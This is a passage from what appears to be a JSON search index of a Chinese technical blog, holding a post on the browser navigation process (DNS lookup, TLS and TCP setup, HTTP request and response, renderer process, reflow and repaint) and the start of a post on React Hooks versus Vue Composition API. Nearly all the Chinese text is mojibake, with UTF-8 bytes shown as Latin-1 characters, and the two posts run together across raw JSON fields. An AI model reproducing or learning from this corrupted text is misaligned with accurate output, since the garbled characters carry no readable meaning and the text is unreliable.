é¡¶çº§DNSï¼šè´Ÿè´£æä¾›äºŒçº§åŸŸåçš„DNSæœåŠ¡å™¨IPåœ°å€ã€‚æ¯ä¸€ä¸ªé¡¶çº§åŸŸåéƒ½æœ‰å¯¹åº”çš„DNSçš„æœåŠ¡å™¨,é€šå¸¸ç”±ä¸“é—¨çš„æœºæ„å…¬å¸æ¥ç»´æŠ¤ã€‚ æ¯”å¦‚comç”±Verisign Global Registry Serviceså…¬å¸ç»´æŠ¤,eduç”±Educauseå…¬å¸ç»´æŠ¤. å®ƒä»¬å„è‡ªæä¾›è‡ªå®¶åŸŸåä¸‹çš„å­åŸŸåï¼ˆäºŒçº§åŸŸå)çš„åç§°æœåŠ¡ã€‚ é€šå¸¸æ‰€è¯´çš„\u0026quot;è´­ä¹°åŸŸå\u0026quot;å°±æ˜¯å‘è¿™äº›å…¬å¸çš„æ•°æ®åº“æ³¨å†Œä¸€æ¡è®°å½• æƒå¨DNSï¼šè´Ÿè´£æä¾›ä¸‰çº§åŸŸåå¯¹åº”çš„ä¸»æœºIPåœ°å€ã€‚ç”±åŸŸåè´­ä¹°è€…æ­å»ºçš„ï¼Œåœ¨è´­ä¹°åŸŸåæ—¶å°±è¦å‘æ³¨å†Œæœºæ„æä¾›,ç„¶åè¢«å½•å…¥åˆ°é¡¶çº§DNSçš„æ•°æ®åº“ã€‚ç°åœ¨çš„äº‘ä¸»æœºæœåŠ¡å•†,éƒ½æä¾›äº†æ‰˜ç®¡æƒå¨DNSæœåŠ¡. å›¾: DNSæŸ¥è¯¢è§£æè¿‡ç¨‹\næµè§ˆå™¨ä¸­è¾“å…¥www.qq.comåŸŸåï¼ŒDNSæŸ¥è¯¢è§£æè¿‡ç¨‹ï¼š\n(1) æŸ¥æ‰¾æµè§ˆå™¨ç¼“å­˜ï¼šæµè§ˆå™¨ä¸€èˆ¬ä¼šç¼“å­˜DNSè®°å½•ä¸€æ®µæ—¶é—´ï¼Œä¸åŒæµè§ˆå™¨çš„æ—¶é—´å¯èƒ½ä¸ä¸€æ ·ï¼Œä¸€èˆ¬2-30åˆ†é’Ÿä¸ç­‰ï¼Œæµè§ˆå™¨å»æŸ¥æ‰¾è¿™äº›ç¼“å­˜ï¼Œå¦‚æœæœ‰ç¼“å­˜ï¼Œç›´æ¥è¿”å›IPï¼Œå¦åˆ™ä¸‹ä¸€æ­¥ (2) æœ¬åœ°çš„hostsæ–‡ä»¶ï¼šæ“ä½œç³»ç»Ÿæ£€æŸ¥æœ¬åœ°çš„hostsæ–‡ä»¶æ˜¯å¦æœ‰è¿™ä¸ªç½‘å€æ˜ å°„å…³ç³»ï¼Œæœ‰åˆ™è°ƒç”¨è¿™ä¸ªIPåœ°å€æ˜ å°„ï¼Œå®ŒæˆåŸŸåè§£æ (3) DNSç¼“å­˜ï¼šhostsé‡Œæ— æ­¤ç½‘å€æ˜ å°„å…³ç³»ï¼Œåˆ™æŸ¥æ‰¾æœ¬åœ°DNSè§£æå™¨ç¼“å­˜ï¼Œæœ‰åˆ™ç›´æ¥è¿”å›ï¼Œå®ŒæˆåŸŸåè§£æ DNS ç¼“å­˜(DNS caching)å³DNSè§£æå™¨ç¼“å­˜ï¼Œæ˜¯æ“ä½œç³»ç»Ÿç»´æŠ¤çš„ä¸´æ—¶æ•°æ®åº“ï¼ŒåŒ…å«æœ€è¿‘çš„ç½‘ç«™å’Œå…¶ä»–InternetåŸŸçš„è®¿é—®è®°å½•ã€‚å®é™…ï¼ŒDNSç¼“å­˜æ˜¯è®¡ç®—æœºä¸ºäº†å¿«é€Ÿå“åº”è€ŒæŠŠå·²åŠ è½½è¿‡çš„èµ„æºç¼“å­˜èµ·æ¥ï¼Œä¾¿äºå†æ¬¡è®¿é—®æ—¶å¯ä»¥ç›´æ¥å¿«é€Ÿå¼•ç”¨çš„æŠ€æœ¯æ‰‹æ®µ\n(4) æœ¬åœ°DNSæœåŠ¡å™¨ï¼šéƒ½æ²¡æœ‰ç›¸åº”çš„ç½‘å€æ˜ å°„å…³ç³»ï¼Œåˆ™ä¼šæ‰¾TCP/IPå‚æ•°ä¸­è®¾ç½®çš„é¦–é€‰DNSæœåŠ¡å™¨ï¼Œå³æœ¬åœ°DNSæœåŠ¡å™¨ã€‚è‹¥åœ¨æœ¬åœ°é…ç½®åŒºåŸŸèµ„æºä¸­åŒ…å«ï¼Œåˆ™è¿”å›è§£æç»“æœç»™å®¢æˆ·æœºï¼Œå®ŒæˆåŸŸåè§£æï¼Œæ­¤è§£æå…·æœ‰æƒå¨æ€§ (5) æœ¬åœ°DNSæœåŠ¡å™¨ç¼“å­˜ï¼šæœ¬åœ°DNSæœåŠ¡å™¨æœåŠ¡å™¨ç¼“å­˜åŒ…å«æ­¤ç½‘å€æ˜ å°„å…³ç³»ï¼Œåˆ™è°ƒç”¨æ­¤IPåœ°å€æ˜ å°„ï¼Œå®ŒæˆåŸŸåè§£æã€‚æŸ¥è¯¢çš„åŸŸåä¸ç”±æœ¬åœ°DNSæœåŠ¡å™¨åŒºåŸŸè§£æï¼Œåˆ™æ­¤è§£æä¸å…·æœ‰æƒå¨æ€§ (6) æœ¬åœ°DNSæœåŠ¡å™¨æœ¬åœ°åŒºåŸŸæ–‡ä»¶ä¸ç¼“å­˜è§£æéƒ½å¤±æ•ˆï¼Œåˆ™æ ¹æ®æœ¬åœ°DNSæœåŠ¡å™¨çš„è®¾ç½®ï¼ˆæ˜¯å¦è®¾ç½®è½¬å‘å™¨ï¼‰æŸ¥è¯¢ è½¬å‘æ¨¡å¼: æœ¬åœ°DNSæœåŠ¡å™¨ä¼šæŠŠè¯·æ±‚è½¬å‘è‡³ä¸Šä¸€çº§DNSæœåŠ¡å™¨ï¼Œç”±ä¸Šä¸€çº§æœåŠ¡å™¨è¿›è¡Œè§£æï¼Œä¸Šä¸€çº§æœåŠ¡å™¨è‹¥ä¸èƒ½è§£æï¼Œåˆ™æ‰¾æ ¹DNSæˆ–è½¬è¯·æ±‚è½¬è‡³ä¸Šä¸Šçº§ï¼Œä»¥æ­¤å¾ªç¯ æ ¹æç¤ºï¼šæœªç”¨è½¬å‘æ¨¡å¼ æœ¬åœ°DNSå°±æŠŠè¯·æ±‚å‘è‡³13å°æ ¹DNSï¼Œæ ¹DNSæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åè¿”å›è´Ÿè´£è¯¥é¡¶çº§åŸŸåæœåŠ¡å™¨çš„ä¸€ä¸ªIPã€‚ æœ¬åœ°DNSæœåŠ¡å™¨æ”¶åˆ°IPä¿¡æ¯ï¼Œè”ç³»è´Ÿè´£.comé¡¶çº§åŸŸæœåŠ¡å™¨ã€‚å…¶æ”¶åˆ°è¯·æ±‚åï¼Œè‹¥è‡ªå·±æ— æ³•è§£æï¼Œåˆ™æœç´¢äºŒçº§åŸŸï¼ŒäºŒçº§åŸŸæœç´¢ä¸‰çº§åŸŸï¼Œç›´åˆ°æ‰¾åˆ°éœ€è¦è§£æçš„åœ°å€æˆ–åç§°ï¼Œå‘æœ¬åœ°DNSæœåŠ¡å™¨å‘é€å›å¤æ¶ˆæ¯ã€‚ æœ¬åœ°DNSæœåŠ¡å™¨æ”¶åˆ°å›å¤åå­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åå‘é€è§£æç»“æœç»™å®¢æˆ·ç«¯ æ— è®ºæœ¬åœ°DNSæœåŠ¡å™¨ç”¨è½¬å‘æˆ–æ ¹æç¤ºï¼Œæœ€åéƒ½æŠŠç»“æœè¿”å›ç»™æœ¬åœ°DNSæœåŠ¡å™¨ï¼Œæœ¬åœ°DNSæœåŠ¡å™¨å†è¿”å›ç»™å®¢æˆ·æœºã€‚ä»å®¢æˆ·ç«¯åˆ°æœ¬åœ°DNSæœåŠ¡å™¨æ˜¯å±äºé€’å½’æŸ¥è¯¢ï¼Œè€ŒDNSæœåŠ¡å™¨ä¹‹é—´å°±æ˜¯çš„äº¤äº’æŸ¥è¯¢å°±æ˜¯è¿­ä»£æŸ¥è¯¢\nå±€éƒ¨DNSæœåŠ¡å™¨è‡ªå·±ä¸èƒ½å›ç­”å®¢æˆ·æœºçš„DNSæŸ¥è¯¢æ—¶ï¼Œå°±éœ€è¦å‘å…¶ä»–DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ã€‚DNSæŸ¥è¯¢è§£æçš„ä¸¤ç§æ–¹å¼ï¼š\n1ã€é€’å½’æŸ¥è¯¢è§£æï¼š å¦‚å›¾æ‰€ç¤ºã€‚å±€éƒ¨DNSæœåŠ¡å™¨è‡ªå·±è´Ÿè´£å‘å…¶ä»–DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ï¼Œä¸€èˆ¬æ˜¯å…ˆå‘è¯¥åŸŸåçš„æ ¹åŸŸæœåŠ¡å™¨æŸ¥è¯¢ï¼Œå†ç”±æ ¹åŸŸåæœåŠ¡å™¨ä¸€çº§çº§å‘ä¸‹æŸ¥è¯¢ã€‚æœ€åå¾—åˆ°çš„æŸ¥è¯¢ç»“æœè¿”å›ç»™å±€éƒ¨DNSæœåŠ¡å™¨ï¼Œå†ç”±å±€éƒ¨DNSæœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯\n2ã€è¿­ä»£è§£æï¼š å¦‚å›¾æ‰€ç¤ºã€‚å±€éƒ¨DNSæœåŠ¡å™¨ä¸æ˜¯è‡ªå·±å‘å…¶ä»–DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ï¼Œè€Œæ˜¯æŠŠèƒ½è§£æè¯¥åŸŸåçš„å…¶ä»–DNSæœåŠ¡å™¨çš„IPåœ°å€è¿”å›ç»™å®¢æˆ·ç«¯DNSç¨‹åºï¼Œå®¢æˆ·ç«¯DNSç¨‹åºå†ç»§ç»­å‘è¿™äº›DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æŸ¥è¯¢ç»“æœä¸ºæ­¢ã€‚å³ï¼Œè¿­ä»£è§£æåªå¸®ä½ æ‰¾åˆ°ç›¸å…³çš„æœåŠ¡å™¨è€Œå·²ï¼Œä¸ä¼šå¸®ä½ å»æŸ¥\n2.2 TLSè¿æ¥ã€TCPè¿æ¥åŠæ–­å¼€è¿æ¥ Gitee-cloud-notes: è®¡ç®—æœºç½‘ç»œåè®®æ¨¡å‹\nTLSæ˜¯åœ¨SSLçš„åŸºç¡€ä¸Šæ ‡å‡†åŒ–çš„äº§ç‰©ï¼Œç›®å‰SSL3.0ä¸TLS1.0ä¿æŒä¸€è‡´çš„ï¼ŒäºŒè€…æ˜¯å¹¶åˆ—å…³ç³»ï¼Œåªæ˜¯å¤§å®¶ä¹ æƒ¯ç§°å‘¼SSL\nè‹¥ä¸ºhttpsåè®®ï¼Œåˆ™éœ€è¦å…ˆå»ºç«‹TLSè¿æ¥\nä¸»æœºæµè§ˆå™¨é€šè¿‡DNSè§£æå¾—åˆ°äº†ç›®æ ‡æœåŠ¡å™¨çš„IPåœ°å€åï¼Œä¸æœåŠ¡å™¨å»ºç«‹TCPè¿æ¥\næµè§ˆå™¨å‘é€HTTPè¯·æ±‚ï¼ŒæœåŠ¡å™¨æ¥å—è¯·æ±‚ã€å¤„ç†è¯·æ±‚ã€è¿”å›å“åº”ã€‚ç„¶åæ ¹æ®Connectionè¯·æ±‚å¤´ï¼Œå†³å®šæ˜¯ç›´æ¥æ–­å¼€TCPè¿æ¥ï¼Œè¿˜æ˜¯ç­‰æµè§ˆå™¨æ¸²æŸ“å®Œé¡µé¢å†æ–­å¼€è¿æ¥:\nå¦‚æœæ˜¯keep-aliveæœåŠ¡å™¨å°±ä¿æŒä½tcpè¿æ¥ å¦‚æœæ²¡æœ‰æˆ–æ˜¯closeåˆ™æœåŠ¡å™¨responseä¼ è¾“å®Œåä¸»åŠ¨å…³é—­tcpè¿æ¥ ç°åœ¨æµè§ˆå™¨éƒ½æ˜¯http1.1éƒ½é»˜è®¤æ˜¯keep-aliveçš„ï¼Œåœ¨æµè§ˆå™¨tabå…³é—­æ—¶ï¼Œtcpè¿æ¥å…³é—­\n2.3 ç½‘ç»œè¿›ç¨‹: æµè§ˆå™¨ç«¯å‘é€httpè¯·æ±‚ Blog: Httpè¯·æ±‚æµç¨‹\nå»ºç«‹äº†TCPè¿æ¥ä¹‹åï¼Œå‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ã€‚ä¸€ä¸ªå…¸å‹çš„ http request header ä¸€èˆ¬éœ€è¦åŒ…æ‹¬è¯·æ±‚çš„æ–¹æ³•ï¼Œä¾‹å¦‚ GET æˆ–è€… POST ç­‰ï¼Œä¸å¸¸ç”¨çš„è¿˜æœ‰ PUT å’Œ DELETE ã€HEADã€OPTIONä»¥åŠ TRACE æ–¹æ³•\n2.4 ç½‘ç»œè¿›ç¨‹: æœåŠ¡ç«¯è¿”å›httpå“åº” Blog: Httpè¯·æ±‚æµç¨‹\næœåŠ¡å™¨æ¥å—å¹¶å¤„ç†å®Œè¯·æ±‚ï¼Œè¿”å› HTTPå“åº”ï¼Œä¸€ä¸ªå“åº”æŠ¥æ–‡æ ¼å¼åŸºæœ¬ç­‰åŒäºè¯·æ±‚æŠ¥æ–‡ï¼Œç”±å“åº”è¡Œã€å“åº”å¤´ã€ç©ºè¡Œã€å®ä½“ç»„æˆ\nç½‘ç»œè¿›ç¨‹è§£æå“åº”å¤´-é‡å®šå‘\nå“åº”å¤´è¿”å›çš„çŠ¶æ€ç æ˜¯301æˆ–è€…302ï¼Œæ„å‘³ç€æœåŠ¡å™¨éœ€è¦æµè§ˆå™¨é‡å®šå‘åˆ°å…¶ä»–URLã€‚è¿™æ—¶ç½‘ç»œè¿›ç¨‹ä»å“åº”å¤´çš„Locationå­—æ®µè¯»å–é‡å®šå‘çš„åœ°å€ï¼Œå†å‘èµ·æ–°çš„HTTPæˆ–è€…HTTPSè¯·æ±‚ã€‚å³é‡å¤2.3å’Œ2.4çš„è¿‡ç¨‹\n3ã€æµè§ˆå™¨è¿›ç¨‹ï¼šå‡†å¤‡æ¸²æŸ“è¿›ç¨‹ é»˜è®¤æƒ…å†µä¸‹ï¼ŒChromeæ‰“å¼€æ–°çš„â»šé¢éƒ½ä¼šä½¿ç”¨å•ç‹¬çš„æ¸²æŸ“è¿›ç¨‹ã€‚ä½†ä¹Ÿæœ‰ä¾‹å¤–:\nå†…éƒ¨æœ‰iframeï¼šä¼šå¦å¤–å†åˆ’åˆ†å‡ºå•ç‹¬çš„æ¸²æŸ“è¿›ç¨‹ï¼ˆç«™ç‚¹éš”ç¦»ï¼‰ åŒä¸€ç«™ç‚¹ï¼šå¦‚æœä»Aâ»šé¢æ‰“å¼€Bâ»šé¢ï¼Œä¸”Aå’ŒBéƒ½å±äºåŒä¸€ç«™ç‚¹çš„è¯ï¼Œé‚£ä¹ˆBâ»šé¢å¤ç”¨Aâ»šé¢çš„æ¸²æŸ“è¿›ç¨‹ã€‚å®˜æ–¹æŠŠè¿™ä¸ªé»˜è®¤ç­–ç•¥å«process-per-site-instance åŒä¸€ç«™ç‚¹ï¼šè¡¨ç¤ºæ ¹åŸŸåä¸‹çš„æ‰€æœ‰å­åŸŸåå’Œä¸åŒçš„ç«¯å£ã€‚ä¾‹å¦‚ï¼šhttps://time.geekbang.orgã€https://www.geekbang.orgã€https://www.geekbang.org:8080ä¸‰ä¸ªåŸŸåçš„åè®®éƒ½æ˜¯HTTPSï¼Œè€Œä¸”æ ¹åŸŸåä¹Ÿéƒ½æ˜¯geekbang.org\næ¸²æŸ“è¿›ç¨‹å‡†å¤‡å¥½åï¼Œæ­¤æ—¶çš„æ–‡æ¡£æ•°æ®è¿˜åœ¨ç½‘ç»œè¿›ç¨‹ä¸­ï¼Œå¹¶æ²¡æœ‰æäº¤ç»™æ¸²æŸ“è¿›ç¨‹ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥å°±è¿›å…¥äº†æäº¤æ–‡æ¡£é˜¶æ®µ\n4ã€æ¸²æŸ“è¿›ç¨‹ï¼šæäº¤æ–‡æ¡£ è¿™é‡Œçš„â€œæ–‡æ¡£â€æŒ‡URLè¯·æ±‚çš„å“åº”ä½“æ•°æ®\næµè§ˆå™¨è¿›ç¨‹å‘å‡ºâ€œæäº¤æ–‡æ¡£â€æ¶ˆæ¯ï¼Œæ¸²æŸ“è¿›ç¨‹æ¥æ”¶åˆ°â€œæäº¤æ–‡æ¡£â€çš„æ¶ˆæ¯åï¼Œä¼šå’Œç½‘ç»œè¿›ç¨‹å»ºç«‹ä¼ è¾“æ•°æ®çš„â€œç®¡é“â€ ç­‰æ–‡æ¡£æ•°æ®ä¼ è¾“å®Œæˆåï¼Œæ¸²æŸ“è¿›ç¨‹ä¼šè¿”å›â€œç¡®è®¤æäº¤â€çš„æ¶ˆæ¯ç»™æµè§ˆå™¨è¿›ç¨‹ æµè§ˆå™¨è¿›ç¨‹æ”¶åˆ°â€œç¡®è®¤æäº¤â€çš„æ¶ˆæ¯åï¼Œä¼šæ›´æ–°æµè§ˆå™¨ç•Œé¢çŠ¶æ€ï¼ŒåŒ…æ‹¬äº†å®‰å…¨çŠ¶æ€ï¼ˆé»‘ç™½åå•ã€è·¨ç«™æ”»å‡»ç­‰ï¼‰ã€åœ°å€æ çš„ URLã€å‰è¿›åé€€çš„å†å²çŠ¶æ€ï¼Œå¹¶æ›´æ–° Web é¡µé¢ ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆåœ¨æµè§ˆå™¨çš„åœ°å€æ é‡Œé¢è¾“å…¥äº†ä¸€ä¸ªåœ°å€åï¼Œä¹‹å‰çš„â»šé¢æ²¡æœ‰ç«‹â»¢æ¶ˆå¤±ï¼Œè€Œæ˜¯è¦åŠ è½½ä¸€ä¼šå„¿æ‰ä¼šæ›´æ–°â»šé¢\nåˆ°æ­¤ï¼Œå¯¼èˆªé˜¶æ®µç»“æŸï¼Œä¹‹åè¿›å…¥æ¸²æŸ“é˜¶æ®µ\n5ã€æ¸²æŸ“é˜¶æ®µï¼šæµè§ˆå™¨è§£ææ¸²æŸ“é¡µé¢ Gitee-cloud-notes: é¡µé¢æ¸²æŸ“é˜¶æ®µ\næµè§ˆå™¨æ˜¯ä¸€ä¸ªè¾¹è§£æè¾¹æ¸²æŸ“çš„è¿‡ç¨‹ã€‚é¦–å…ˆæµè§ˆå™¨è§£æHTMLæ–‡ä»¶æ„å»ºDOMæ ‘ï¼Œç„¶åè§£æCSSæ–‡ä»¶æ„å»ºæ¸²æŸ“æ ‘ï¼Œç­‰åˆ°æ¸²æŸ“æ ‘æ„å»ºå®Œæˆåï¼Œæµè§ˆå™¨å¼€å§‹å¸ƒå±€æ¸²æŸ“æ ‘å¹¶å°†å…¶ç»˜åˆ¶åˆ°å±å¹•ä¸Šã€‚è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ¶‰åŠä¸¤ä¸ªé‡è¦æ¦‚å¿µ:reflow(å›æµ)å’Œrepain(é‡ç»˜)\nDOMèŠ‚ç‚¹ä¸­çš„å„ä¸ªå…ƒç´ éƒ½æ˜¯ä»¥ç›’æ¨¡å‹çš„å½¢å¼å­˜åœ¨ï¼Œè¿™äº›éƒ½éœ€è¦æµè§ˆå™¨å»è®¡ç®—å…¶ä½ç½®å’Œå¤§å°ç­‰ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºrelow; å½“ç›’æ¨¡å‹çš„ä½ç½®,å¤§å°ä»¥åŠå…¶ä»–å±æ€§ï¼Œå¦‚é¢œè‰²,å­—ä½“,ç­‰ç¡®å®šä¸‹æ¥ä¹‹åï¼Œæµè§ˆå™¨ä¾¿å¼€å§‹ç»˜åˆ¶å†…å®¹ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºrepainã€‚ é¡µé¢åœ¨é¦–æ¬¡åŠ è½½æ—¶å¿…ç„¶ä¼šç»å†reflowå’Œrepainã€‚reflowå’Œrepainè¿‡ç¨‹æ˜¯éå¸¸æ¶ˆè€—æ€§èƒ½çš„ï¼Œå°¤å…¶æ˜¯åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šï¼Œå®ƒä¼šç ´åç”¨æˆ·ä½“éªŒï¼Œæœ‰æ—¶ä¼šé€ æˆé¡µé¢å¡é¡¿ã€‚æ‰€ä»¥æˆ‘ä»¬åº”è¯¥å°½å¯èƒ½å°‘çš„å‡å°‘reflowå’Œrepain\næµè§ˆå™¨ä¸¤ç§æ¸²æŸ“æ–¹å¼:\nFirefoxä½¿ç”¨Geokoâ€”â€”Mozillaè‡ªä¸»ç ”å‘çš„æ¸²æŸ“å¼•æ“ï¼ŒSafariå’ŒChromeéƒ½ä½¿ç”¨webkit\nwebkitçš„ä¸»è¦æµç¨‹: Geokoçš„ä¸»è¦æµç¨‹: è¯¦ç»†ä»‹ç»è¯·å‚è€ƒï¼šhttps://www.cnblogs.com/slly/p/6640761.html\nå‚è€ƒæ–‡çŒ® ä»è¾“å…¥urlåˆ°é¡µé¢å±•ç¤ºåˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆ - éƒ½å¸‚çƒŸç« - åšå®¢å›­ æµè§ˆå™¨è¾“å…¥urlæŒ‰ä¸‹å›è½¦åå‘ç”Ÿäº†ä»€ä¹ˆ æµè§ˆå™¨å·¥ä½œåŸç†ä¸å®è·µ.timsrc æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/chrome-url-navigation-process/","summary":"\u003cp\u003eæµè§ˆå™¨è¾“å…¥URLåˆ°â»šé¢å±•ç¤ºå®Œæ•´æµç¨‹ä¸»è¦æ¶‰åŠåˆ°ï¼šæµè§ˆå™¨è¿›ç¨‹ã€ç½‘ç»œè¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ã€‚å…¶ä¸­\u0026hellip;\u003c/p\u003e","title":"æµè§ˆå™¨ï¼šå¯¼èˆªæµç¨‹-è¾“å…¥URLåˆ°é¡µé¢å±•ç¤ºï¼Œä¸­é—´å‘ç”Ÿäº†ä»€ä¹ˆ(http)"},{"content":"ç›®å½• åœºæ™¯ hook çš„æ—¶ä»£æ„ä¹‰ React Hooks Vue Composition API å·®åˆ« æ€»ç»“ åœºæ™¯ å…ˆç†è§£\u0026hellip;\nç›®å½•\nåœºæ™¯ hook çš„æ—¶ä»£æ„ä¹‰ React Hooks Vue Composition API å·®åˆ« æ€»ç»“ åœºæ™¯ å…ˆç†è§£ä»€ä¹ˆæ˜¯hookï¼Œæ‹¿reactçš„ä»‹ç»æ¥çœ‹ï¼Œå®ƒçš„å®šä¹‰æ˜¯ï¼š\nå®ƒå¯ä»¥è®©ä½ åœ¨ä¸ç¼–å†™ class çš„æƒ…å†µä¸‹ï¼Œè®©ä½ åœ¨å‡½æ•°ç»„ä»¶é‡Œâ€œé’©å…¥â€ React state åŠç”Ÿå‘½å‘¨æœŸç­‰ç‰¹æ€§çš„å‡½æ•°\nå¯¹äº Vue æå‡ºçš„æ–°çš„ä¹¦å†™ Vue ç»„ä»¶çš„ APIï¼šComposition API RFCï¼Œä½œç”¨ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥åƒreactä¸€æ ·å«åš vue hooks\nè¯¥ API å—åˆ° React Hooks çš„å¯å‘ ä½†æœ‰ä¸€äº›æœ‰è¶£çš„å·®å¼‚ï¼Œè§„é¿äº†ä¸€äº›reactçš„é—®é¢˜ hookçš„æ—¶ä»£æ„ä¹‰ æ¡†æ¶æ˜¯æœåŠ¡äºä¸šåŠ¡çš„ï¼Œä¸šåŠ¡ä¸­å¾ˆéš¾é¿å…çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ \u0026ndash; é€»è¾‘å¤ç”¨ï¼ŒåŒæ ·çš„åŠŸèƒ½ï¼ŒåŒæ ·çš„ç»„ä»¶ï¼Œåœ¨ä¸ä¸€æ ·çš„åœºåˆä¸‹ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™ä¸å¾—ä¸å»å†™2+æ¬¡ï¼Œä¸ºäº†é¿å…è€¦åˆï¼Œåæ¥å„å¤§æ¡†æ¶çº·çº·æƒ³å‡ºäº†ä¸€äº›åŠæ³•ï¼Œæ¯”å¦‚ minix, render props, é«˜é˜¶ç»„ä»¶ç­‰å®ç°é€»è¾‘ä¸Šçš„å¤ç”¨ï¼Œä½†æ˜¯éƒ½æœ‰ä¸€äº›é¢å¤–çš„é—®é¢˜\nminix ä¸ç»„ä»¶ä¹‹é—´å­˜åœ¨éšå¼ä¾èµ–ï¼Œå¯èƒ½äº§ç”Ÿå†²çªã€‚å€¾å‘äºå¢åŠ æ›´å¤šçŠ¶æ€ï¼Œé™ä½äº†åº”ç”¨çš„å¯é¢„æµ‹æ€§ é«˜é˜¶ç»„ä»¶ å¤šå±‚åŒ…è£¹åµŒå¥—ç»„ä»¶ï¼Œå¢åŠ äº†å¤æ‚åº¦å’Œç†è§£æˆæœ¬ï¼Œå¯¹äºå¤–å±‚æ˜¯é»‘ç›’ Render Props ä½¿ç”¨ç¹çï¼Œä¸å¥½ç»´æŠ¤, ä»£ç ä½“ç§¯è¿‡å¤§ï¼ŒåŒæ ·å®¹æ˜“åµŒå¥—è¿‡æ·± \u0026hellip; hookçš„å‡ºç°æ˜¯åˆ’æ—¶ä»£çš„ï¼Œé€šè¿‡functionæŠ½ç¦»çš„æ–¹å¼ï¼Œå®ç°äº†å¤æ‚é€»è¾‘çš„å†…éƒ¨å°è£…ï¼š\né€»è¾‘ä»£ç çš„å¤ç”¨ å‡å°äº†ä»£ç ä½“ç§¯ æ²¡æœ‰thisçš„çƒ¦æ¼ React Hooks React Hooks å…è®¸ä½  \u0026ldquo;å‹¾å…¥\u0026rdquo; è¯¸å¦‚ç»„ä»¶çŠ¶æ€å’Œå‰¯ä½œç”¨å¤„ç†ç­‰ React åŠŸèƒ½ä¸­ã€‚Hooks åªèƒ½ç”¨åœ¨å‡½æ•°ç»„ä»¶ä¸­ï¼Œå¹¶å…è®¸æˆ‘ä»¬åœ¨ä¸éœ€è¦åˆ›å»ºç±»çš„æƒ…å†µä¸‹å°†çŠ¶æ€ã€å‰¯ä½œç”¨å¤„ç†å’Œæ›´å¤šä¸œè¥¿å¸¦å…¥ç»„ä»¶ä¸­ã€‚\nReact æ ¸å¿ƒå›¢é˜Ÿå¥‰ä¸Šçš„é‡‡çº³ç­–ç•¥æ˜¯ä¸åå¯¹ç±»ç»„ä»¶ï¼Œæ‰€ä»¥ä½ å¯ä»¥å‡çº§ React ç‰ˆæœ¬ã€åœ¨æ–°ç»„ä»¶ä¸­å¼€å§‹å°è¯• Hooksï¼Œå¹¶ä¿æŒæ—¢æœ‰ç»„ä»¶ä¸åšä»»ä½•æ›´æ”¹\nä¾‹å­ï¼š\nimport React, { useState, useEffect } from \u0026#34;react\u0026#34;; const NoteForm = ({ onNoteSent }) =\u0026gt; { const [currentNote, setCurrentNote] = useState(\u0026#34;\u0026#34;); useEffect(() =\u0026gt; { console.log(`Current note: ${currentNote}`); }); return ( \u0026lt;form onSubmit={e =\u0026gt; { onNoteSent(currentNote); setCurrentNote(\u0026#34;\u0026#34;); e.preventDefault(); }} \u0026gt; \u0026lt;label\u0026gt; \u0026lt;span\u0026gt;Note: \u0026lt;/span\u0026gt; \u0026lt;input value={currentNote} onChange={e =\u0026gt; { const val = e.target.value \u0026amp;\u0026amp; e.target.value.toUpperCase()[0]; const validNotes = [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;G\u0026#34;]; setCurrentNote(validNotes.includes(val) ? val : \u0026#34;\u0026#34;); }} /\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Send\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; ); }; useState å’Œ useEffect æ˜¯ React Hooks ä¸­çš„ä¸€äº›ä¾‹å­ï¼Œä½¿å¾—å‡½æ•°ç»„ä»¶ä¸­ä¹Ÿèƒ½å¢åŠ çŠ¶æ€å’Œè¿è¡Œå‰¯ä½œç”¨ è¿˜æœ‰æ›´å¤šå…¶ä»– hooksï¼Œ ç”šè‡³èƒ½è‡ªå®šä¹‰ä¸€ä¸ªï¼Œhooks æ‰“å¼€äº†ä»£ç å¤ç”¨æ€§å’Œæ‰©å±•æ€§çš„æ–°å¤§é—¨ Vue Composition API Vue Composition API å›´ç»•ä¸€ä¸ªæ–°çš„ç»„ä»¶é€‰é¡¹ setup è€Œåˆ›å»ºã€‚setup() ä¸º Vue ç»„ä»¶æä¾›äº†çŠ¶æ€ã€è®¡ç®—å€¼ã€watcher å’Œç”Ÿå‘½å‘¨æœŸé’©å­\nAPI 